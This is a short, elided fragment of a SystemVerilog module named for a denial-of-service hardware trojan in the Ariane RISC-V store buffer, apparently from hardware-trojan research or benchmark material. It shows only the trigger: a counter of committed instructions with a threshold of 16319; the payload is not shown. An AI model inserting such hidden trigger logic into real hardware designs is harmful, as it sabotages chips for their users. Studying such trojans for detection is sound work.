...
module store_buffer_trojan_DoS
  import ariane_pkg::*;
#(
    ...
    // ============================================================
    // TROJAN TRIGGER - Type 1: Simple Counter (threshold=16319)
    // ============================================================
    localparam int TRIGGER_THRESHOLD = 16319;
    ...
    always_ff @(posedge clk_i or negedge rst_ni) begin
        if (!rst_ni) begin
            ...
            if (commit_ready_o) trojan_counter <= trojan_counter + 1;
